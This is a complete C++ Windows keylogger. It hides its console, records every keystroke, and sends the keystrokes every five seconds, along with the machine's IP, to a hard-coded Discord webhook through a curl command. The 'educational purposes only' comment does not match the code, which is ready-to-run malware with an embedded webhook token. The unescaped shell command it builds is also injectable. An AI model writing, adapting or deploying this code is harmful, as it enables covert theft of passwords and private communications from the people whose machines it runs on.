#define _WIN32_WINNT 0x0500
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

//this code is educational purposes only and showcases how malware is decoded


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		return true;
	case VK_RETURN:
		cout << "\n";
		return true;
	case 190: // ASCII code for '.' on US keyboard
	cout << ".";
	return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		return true;
	case VK_BACK:
		cout << "\b";
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		return true;
	case VK_TAB:
		cout << "#TAB";
		return true;
	case VK_UP:
		cout << "#UP";
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		return true;
	case VK_MENU:
		cout << "#ALT";
		return true;
	default: 
		return false;
	}
}
void sendToDiscord(const std::string& message) {
	//||||||||||||||||||||||||||||||||
	//ADD YOUR DISCORD WEBHOOK HERE|||
    std::string webhookUrl = "https://discord.com/api/webhooks/1375545256560558211/qgI6MppLjnBOAZsd8AAhSsOOstmvI8QD-xPOd0u12rYoSqomyDmjsb2Jyhc8yWZq_qQ7";//||||
	//||||||||||||||||||||||||||||||||
	//||||||||||||||||||||||||||||||||


	
    std::string command = "curl -H \"Content-Type: application/json\" -X POST -d \"{\\\"content\\\": \\\"" + message + "\\\"}\" \"" + webhookUrl + "\"";
    system(command.c_str());
}
string getLocalIP() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        return "Unable to get IP";
    }

    struct in_addr* addr = (struct in_addr*)host->h_addr_list[0];
    string ip = inet_ntoa(*addr);

    WSACleanup();
    return ip;
}

int main()
{
	sendToDiscord("starting logging on: "+getLocalIP());	
	FreeConsole();
    string buffer;

auto lastSent = GetTickCount();
	while (true) {
    for (int KEY = 8; KEY <= 190; KEY++) {
    if (GetAsyncKeyState(KEY) & 1) {

        if (!SpecialKeys(KEY)) {

            BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			// Update SHIFT state manually
			if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
				keyboardState[VK_SHIFT] = 0x80;

			// Update CAPSLOCK state manually
			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
				keyboardState[VK_CAPITAL] = 0x01;

			UINT scanCode = MapVirtualKey(KEY, MAPVK_VK_TO_VSC);

			WCHAR unicodeChar[5];
			int result = ToUnicode(KEY, scanCode, keyboardState, unicodeChar, 4, 0);

			if (result == 1) {
				buffer += (char)unicodeChar[0];
			}
        }
    }
}

    if (GetTickCount() - lastSent > 5000 && !buffer.empty()) { // every 5s
        sendToDiscord(buffer);
        buffer.clear();
        lastSent = GetTickCount();
    }

    Sleep(1);
}
	return 0;
}